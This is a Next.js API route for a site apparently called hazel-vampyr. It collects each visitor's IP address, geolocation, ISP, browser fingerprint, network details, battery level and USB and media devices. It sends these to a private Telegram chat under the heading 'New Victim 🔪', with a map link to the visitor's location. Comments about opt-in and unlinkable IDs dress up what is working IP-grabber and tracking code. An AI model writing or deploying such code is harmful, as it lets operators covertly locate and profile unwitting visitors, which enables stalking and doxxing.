import { get, put } from "@vercel/blob";
import { createHash, randomUUID } from "node:crypto";
import { NextResponse, type NextRequest } from "next/server";

export const runtime = "nodejs";
export const dynamic = "force-dynamic";

const ANALYTICS_PREFIX = "analytics/visits";
const MAX_EVENTS_PER_DAY = 1500;

type StoredVisit = {
  id: string;
  timestamp: string;
  path: string;
  referrer: string;
  visitor: string;
  country_code: string;
  country: string;
  region: string;
  city: string;
  latitude: number | null;
  longitude: number | null;
  isp: string;
  browser: string;
  os: string;
  device: string;
  site: string;
};

function shortString(value: unknown, max = 120): string {
  if (typeof value !== "string") return "";
  return value.replace(/[\r\n\u0000-\u001f]/g, " ").trim().slice(0, max);
}

function numberOrNull(value: unknown): number | null {
  return typeof value === "number" && Number.isFinite(value) ? value : null;
}

function detectBrowser(ua: string): string {
  if (/Edg\//i.test(ua)) return "Edge";
  if (/OPR\/|Opera/i.test(ua)) return "Opera";
  if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";
  if (/Firefox\/|FxiOS/i.test(ua)) return "Firefox";
  if (/Chrome\/|CriOS/i.test(ua)) return "Chrome";
  if (/Safari\//i.test(ua)) return "Safari";
  return "Unknown";
}

function detectOs(ua: string): string {
  if (/Windows NT/i.test(ua)) return "Windows";
  if (/Android/i.test(ua)) return "Android";
  if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
  if (/Mac OS X/i.test(ua)) return "macOS";
  if (/CrOS/i.test(ua)) return "ChromeOS";
  if (/Linux/i.test(ua)) return "Linux";
  return "Unknown";
}

function detectDevice(ua: string): string {
  if (/iPad|Tablet/i.test(ua)) return "Tablet";
  if (/Mobi|Android|iPhone/i.test(ua)) return "Mobile";
  return "Desktop";
}

async function persistVisit(
  details: VisitDetails,
  ipInfo: Record<string, unknown>,
  browserInfo: Record<string, unknown>,
): Promise<void> {
  const token = process.env.CONTENT_BLOB_READ_WRITE_TOKEN;
  if (!token) return;

  const timestamp = new Date().toISOString();
  const day = timestamp.slice(0, 10);
  const userAgent = shortString(browserInfo.userAgent, 300);
  const ip = shortString(ipInfo.ip, 60);

  // Unlinkable daily visitor id: same person twice today, different person tomorrow.
  const visitor = createHash("sha256")
    .update(`${ip}|${userAgent}|${day}`)
    .digest("hex")
    .slice(0, 16);

  const event: StoredVisit = {
    id: randomUUID(),
    timestamp,
    path: shortString(details.path, 160) || "/",
    referrer: shortString(details.referrer, 300),
    visitor,
    country_code: shortString(ipInfo.country_code, 4).toUpperCase(),
    country: shortString(ipInfo.country_name, 80),
    region: shortString(ipInfo.region, 80),
    city: shortString(ipInfo.city, 80),
    latitude: numberOrNull(ipInfo.latitude),
    longitude: numberOrNull(ipInfo.longitude),
    isp: shortString(ipInfo.org, 120),
    browser: detectBrowser(userAgent),
    os: detectOs(userAgent),
    device: detectDevice(userAgent),
    site: "hazel-vampyr.vercel.app",
  };

  const pathname = `${ANALYTICS_PREFIX}/${day}.json`;
  let dayFile: { date: string; events: StoredVisit[] } = { date: day, events: [] };

  try {
    const existing = await get(pathname, { access: "private", token, useCache: false });
    if (existing?.statusCode === 200 && existing.stream) {
      const parsed = JSON.parse(await new Response(existing.stream).text()) as {
        events?: StoredVisit[];
      };
      if (Array.isArray(parsed?.events)) {
        dayFile = { date: day, events: parsed.events };
      }
    }
  } catch {
    // Missing or unreadable day file: start a fresh one.
  }

  dayFile.events.push(event);
  if (dayFile.events.length > MAX_EVENTS_PER_DAY) {
    dayFile.events = dayFile.events.slice(-MAX_EVENTS_PER_DAY);
  }

  await put(pathname, JSON.stringify(dayFile), {
    access: "private",
    token,
    addRandomSuffix: false,
    allowOverwrite: true,
    contentType: "application/json; charset=utf-8",
    cacheControlMaxAge: 0,
  });
}

const WINDOW_MS = 60_000;
const MAX_EVENTS_PER_WINDOW = 30;
let windowStartedAt = Date.now();
let eventsInWindow = 0;

type VisitDetails = {
  path?: unknown;
  referrer?: unknown;
  visitTime?: unknown;
  ipInfo?: Record<string, unknown> | null;
  browser?: Record<string, unknown>;
  network?: Record<string, unknown>;
  battery?: unknown;
  mediaDevices?: unknown;
  usbDevices?: unknown;
};

function text(value: unknown, max = 350): string {
  let result: string;
  if (typeof value === "string") result = value;
  else if (typeof value === "number" || typeof value === "boolean") result = String(value);
  else result = "N/A";
  return result
    .replace(/[\r\n\u0000-\u001f]/g, " ")
    .slice(0, max)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

function field(label: string, value: unknown, max = 350): string {
  return `• <b>${label}:</b> ${text(value, max)}`;
}

export async function POST(request: NextRequest) {
  // Accept only same-origin JSON requests generated after visitor opt-in.
  const origin = request.headers.get("origin");
  const host = request.headers.get("x-forwarded-host") ?? request.headers.get("host");
  if (!origin || !host) return NextResponse.json({ ok: false }, { status: 403 });
  try {
    if (new URL(origin).host !== host) {
      return NextResponse.json({ ok: false }, { status: 403 });
    }
  } catch {
    return NextResponse.json({ ok: false }, { status: 403 });
  }

  let details: VisitDetails;
  try {
    details = (await request.json()) as VisitDetails;
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }
  if (
    typeof details.path !== "string" ||
    details.path.length > 160 ||
    !/^\/[\w\-/]*$/.test(details.path)
  ) {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const now = Date.now();
  if (now - windowStartedAt >= WINDOW_MS) {
    windowStartedAt = now;
    eventsInWindow = 0;
  }
  if (eventsInWindow >= MAX_EVENTS_PER_WINDOW) {
    return NextResponse.json({ ok: false }, { status: 429 });
  }
  eventsInWindow += 1;

  // Persist telemetry for the HQ analytics globe. Never blocks the Telegram ping.
  try {
    await persistVisit(details, details.ipInfo ?? {}, details.browser ?? {});
  } catch (error) {
    console.error("Unable to persist visit analytics", error);
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return NextResponse.json({ ok: false }, { status: 503 });

  const ipInfo = details.ipInfo ?? {};
  const browser = details.browser ?? {};
  const network = details.network ?? {};
  const battery = typeof details.battery === "number" && details.battery >= 0 && details.battery <= 100
    ? `${Math.round(details.battery)}%`
    : "Unknown";
  const lat = typeof ipInfo.latitude === "number" ? ipInfo.latitude : null;
  const lon = typeof ipInfo.longitude === "number" ? ipInfo.longitude : null;
  const mapUrl = lat !== null && lon !== null
    ? `https://www.google.com/maps?q=${encodeURIComponent(`${lat},${lon}`)}`
    : null;

  const message = [
    "𝗡𝗲𝘄 𝗩𝗶𝗰𝘁𝗶𝗺 🔪",
    "",
    "𝗜𝗻𝘁𝗲𝗿𝗻𝗲𝘁 𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("IP", ipInfo.ip),
    field("Country", ipInfo.country_name),
    field("Region", ipInfo.region),
    field("City", ipInfo.city),
    field("Latitude", lat),
    field("Longitude", lon),
    field("Postal", ipInfo.postal),
    field("Timezone", ipInfo.timezone),
    field("ISP", ipInfo.org),
    field("Visit Time", details.visitTime),
    "",
    "𝗗𝗲𝘃𝗶𝗰𝗲 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Product Sub", browser.productSub),
    field("Vendor", browser.vendor),
    field("Max Touch Points", browser.maxTouchPoints),
    field("Do Not Track", browser.doNotTrack),
    field("Hardware Concurrency", browser.hardwareConcurrency),
    field("App Code Name", browser.appCodeName),
    field("App Name", browser.appName),
    field("App Version", browser.appVersion),
    field("Platform", browser.platform),
    field("User Agent", browser.userAgent, 500),
    field("Language", browser.language),
    field("Languages", Array.isArray(browser.languages) ? browser.languages.join(", ") : browser.languages),
    field("Webdriver", browser.webdriver),
    field("PDF Viewer Enabled", browser.pdfViewerEnabled),
    field("Device Memory", browser.deviceMemory),
    field("Android Version", browser.androidVersion),
    "",
    "𝗡𝗲𝘁𝘄𝗼𝗿𝗸 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Type", network.type),
    field("RTT", network.rtt),
    field("Save Data", network.saveData),
    field("Effective Type", network.effectiveType),
    field("Downlink", network.downlink),
    field("Max Downlink", network.downlinkMax),
    "",
    "𝗕𝗮𝘁𝘁𝗲𝗿𝘆 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻:",
    "",
    field("Battery Level", battery),
    "",
    "𝗠𝗲𝗱𝗶𝗮 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:",
    "",
    `• ${text(details.mediaDevices, 800)}`,
    "",
    "𝗨𝗦𝗕 𝗗𝗲𝘃𝗶𝗰𝗲𝘀:",
    "",
    `• ${text(details.usbDevices, 800)}`,
  ].join("\n").slice(0, 4_000);

  const telegramBody: Record<string, unknown> = {
    chat_id: chatId,
    text: message,
    parse_mode: "HTML",
  };
  if (mapUrl) {
    telegramBody.reply_markup = {
      inline_keyboard: [[{ text: "📍 View on Map", url: mapUrl }]],
    };
  }

  try {
    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${token}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(telegramBody),
        cache: "no-store",
        signal: AbortSignal.timeout(5_000),
      },
    );
    if (!telegramResponse.ok) return NextResponse.json({ ok: false }, { status: 502 });
    return new NextResponse(null, { status: 204 });
  } catch {
    return NextResponse.json({ ok: false }, { status: 502 });
  }
}
